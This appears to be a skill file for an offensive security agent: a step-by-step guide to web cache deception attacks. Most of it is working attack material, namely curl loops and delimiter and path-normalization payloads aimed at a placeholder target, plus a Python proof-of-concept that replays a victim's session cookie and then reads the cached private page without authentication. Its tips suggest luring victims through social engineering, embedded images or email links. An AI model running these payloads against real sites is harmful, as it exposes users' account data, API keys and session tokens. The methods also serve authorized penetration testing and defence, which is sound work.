---
name: web-cache-deception
description: Web cache deception attacks exploiting path confusion between caches and origins including delimiter-based, normalization-based, and CDN-specific techniques to serve authenticated content to attackers
---

# Web Cache Deception — Expert-Level Testing

Web cache deception tricks a cache into storing authenticated, user-specific responses as public cached content. The attacker makes a victim visit a crafted URL; the cache stores the private response as if it were static; the attacker then retrieves it without authentication.

## Step 1: Identify Cache Behavior

```bash
# Check for cache presence and response headers
curl -sI "https://TARGET/" | grep -iE "x-cache|cf-cache|age|x-varnish|x-cdn|fastly|akamai|via|cache-control"

# Identify cacheable file types by testing static extensions
for ext in css js png jpg gif svg woff woff2 ico json xml pdf ttf eot; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/test123.$ext")
  echo "$ext → $STATUS"
done

# Test cache keying by sending same URL twice, checking for X-Cache: HIT
URL="https://TARGET/static/test$(date +%s).css"
curl -sk "$URL" -o /dev/null -D - 2>/dev/null | grep -i "x-cache"
curl -sk "$URL" -o /dev/null -D - 2>/dev/null | grep -i "x-cache"
# If second response shows HIT → cache is actively caching
```

## Step 2: Path-Based Cache Deception (Classic)

```bash
# The origin ignores the trailing path segment; the cache sees a static file extension

# Test if origin treats these as the same page:
curl -sk "https://TARGET/account/settings" -o orig.html
curl -sk "https://TARGET/account/settings/nonexistent.css" -o test.html
diff orig.html test.html  # If identical → origin ignores suffix → deception possible

# Test ALL static extensions
for ext in css js png jpg gif svg woff woff2 ico json xml pdf ttf eot avif webp; do
  curl -sk "https://TARGET/my-account/anything.$ext" -D - | head -3
done

# Test with path delimiter confusion
curl -sk "https://TARGET/my-account;anything.css" -D -        # Semicolon (Java/Tomcat)
curl -sk "https://TARGET/my-account%23anything.css" -D -      # URL-encoded #
curl -sk "https://TARGET/my-account%3Fanything.css" -D -      # URL-encoded ?
curl -sk "https://TARGET/my-account%00anything.css" -D -      # Null byte
```

## Step 3: Delimiter-Based Cache Deception

Different caches and origins parse URL delimiters differently. If the cache considers a delimiter as part of the path but the origin treats it as a separator, you can inject cacheable suffixes.

```bash
# Semicolon delimiter (Java servers treat ; as path parameter separator)
# Cache sees: GET /my-account;x.css → caches as static file
# Origin sees: GET /my-account → serves authenticated content
curl -sk "https://TARGET/my-account;anything.css" -D -
curl -sk "https://TARGET/my-account;anything.js" -D -

# Hash/fragment (some proxies don't strip # before forwarding)
curl -sk "https://TARGET/my-account%23anything.css" -D -

# Question mark (double encoding)
curl -sk "https://TARGET/my-account%3Fx=1.css" -D -

# Null byte truncation
curl -sk "https://TARGET/my-account%00.css" -D -
curl -sk "https://TARGET/my-account%00.js" -D -

# Newline injection 
curl -sk "https://TARGET/my-account%0d%0a.css" -D -

# Exclamation mark (Akamai-specific delimiter)
curl -sk "https://TARGET/my-account!.css" -D -

# Dollar sign
curl -sk "https://TARGET/my-account$.css" -D -

# Pipe
curl -sk "https://TARGET/my-account|.css" -D -
```

## Step 4: Normalization-Based Cache Deception

Exploit differences in how the cache vs origin normalizes dot-segments (`..`, `.`):

```bash
# Cache stores by raw path; origin normalizes before routing

# Dot-segment: cache sees /static/../my-account → keys as /static/../my-account
# Origin normalizes to /my-account → serves authenticated content
curl -sk "https://TARGET/static/../my-account" -D -

# Double encoding of dot segments
curl -sk "https://TARGET/static/%2e%2e/my-account" -D -
curl -sk "https://TARGET/static/..%2fmy-account" -D -
curl -sk "https://TARGET/static/%2e%2e%2fmy-account" -D -

# Combine normalization with static path prefix
# Cache thinks this is under /static/ → cacheable
curl -sk "https://TARGET/static/..%2f..%2fmy-account" -D -

# Akamai-specific: /static/..;/my-account
curl -sk "https://TARGET/static/..;/my-account" -D -

# Test if the CDN caches paths under /static/ or /assets/ by default
curl -sk "https://TARGET/assets/../my-account" -D -
curl -sk "https://TARGET/resources/../my-account" -D -
curl -sk "https://TARGET/media/../my-account" -D -
```

## Step 5: Static Directory Prefix Mapping

Some CDNs cache everything under certain path prefixes (e.g., `/static/`, `/assets/`):

```bash
# Identify cacheable directories
for prefix in static assets resources media images css js fonts public dist build; do
  RESP=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/$prefix/test.css")
  CACHE=$(curl -sI "https://TARGET/$prefix/test.css" | grep -i "x-cache" | head -1)
  echo "$prefix → $RESP $CACHE"
done

# If /static/ is cached, use normalization to serve authenticated content from it:
curl -sk "https://TARGET/static/..%2fmy-account" -D - | head -20
```

## Step 6: Full Exploitation Flow

```python
#!/usr/bin/env python3
"""Web Cache Deception exploitation proof-of-concept.
Tests multiple deception vectors and confirms cached private data."""
import requests, time, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET"
AUTH_PATH = "/my-account"  # Path that returns authenticated content
AUTH_COOKIE = "session=VICTIM_SESSION_HERE"  # Victim's session cookie

# Vectors to test
VECTORS = [
    f"{AUTH_PATH}/x.css",
    f"{AUTH_PATH}/x.js",
    f"{AUTH_PATH}/x.png",
    f"{AUTH_PATH};x.css",
    f"{AUTH_PATH}%23x.css",
    f"{AUTH_PATH}%3Fx.css",
    f"{AUTH_PATH}%00.css",
    f"/static/..{AUTH_PATH}",
    f"/static/%2e%2e{AUTH_PATH}",
    f"/static/..%2f..%2f{AUTH_PATH.lstrip('/')}",
    f"/assets/../{AUTH_PATH.lstrip('/')}",
]

for vector in VECTORS:
    url = f"{TARGET}{vector}"
    cachebuster = f"?cb={int(time.time())}"
    
    # Step 1: Victim visits the URL (authenticated)
    r1 = requests.get(url + cachebuster, headers={"Cookie": AUTH_COOKIE}, verify=False, timeout=10)
    
    # Step 2: Attacker retrieves from cache (unauthenticated)
    time.sleep(1)
    r2 = requests.get(url + cachebuster, verify=False, timeout=10)
    
    # Check if authenticated content was cached
    cache_header = r2.headers.get("X-Cache", r2.headers.get("cf-cache-status", ""))
    has_private_data = "email" in r2.text.lower() or "api" in r2.text.lower() or "token" in r2.text.lower()
    
    if has_private_data and ("HIT" in cache_header.upper() or r1.text == r2.text):
        print(f"[VULN] Cache deception via: {vector}")
        print(f"  Cache: {cache_header}")
        print(f"  Private data in cached response: {r2.text[:200]}")
    else:
        print(f"[INFO] {vector} — no deception ({cache_header})")
```

## Testing Methodology

1. **Identify cache** — check `X-Cache`, `Age`, `Via`, `cf-cache-status` headers
2. **Map cacheable paths** — find paths/extensions the cache considers static
3. **Test path suffix** — append `.css`, `.js`, `.png` to authenticated pages
4. **Test delimiters** — semicolons, null bytes, encoded hash/question marks
5. **Test normalization** — `../` prefix under cached directories (`/static/..%2f`)
6. **Verify caching** — confirm `X-Cache: HIT` on second unauthenticated request
7. **Confirm private data** — verify the cached response contains authenticated content

## Validation

1. Authenticated content (email, API key, profile data) returned to unauthenticated request
2. `X-Cache: HIT` or `cf-cache-status: HIT` confirms the response came from cache
3. Two sequential requests: first with auth cookie, second without → same content

## Impact

- **High**: Account data theft — attacker retrieves victim's profile, API keys, tokens
- **High**: Session hijacking — if session tokens appear in cached page
- **Medium**: PII disclosure — emails, addresses, phone numbers from cached responses

## Pro Tips

1. **Victim must visit the URL first** — use social engineering, embedded images, or email links
2. **Cachebuster parameter** — use unique query param to avoid poisoning shared cache
3. **Semicolon trick** works best on Java/Tomcat servers (`;` is path parameter separator)
4. **Normalization trick** works best when CDN doesn't normalize `../` before cache key
5. **Test ALL static extensions** — different CDNs cache different file types
6. **Web cache deception ≠ cache poisoning** — deception serves REAL content, poisoning serves MODIFIED content
7. **CDN-specific behaviors**: Cloudflare caches by extension, Akamai caches by path prefix, Fastly is configurable
8. **Static directory prefixes** (`/static/`, `/assets/`) are often configured as unconditionally cacheable
9. **Double encoding** (`%2e%2e%2f`) often bypasses normalization at the proxy but is decoded by the origin
10. **Check TTL** — cache must live long enough (>30s) for practical exploitation
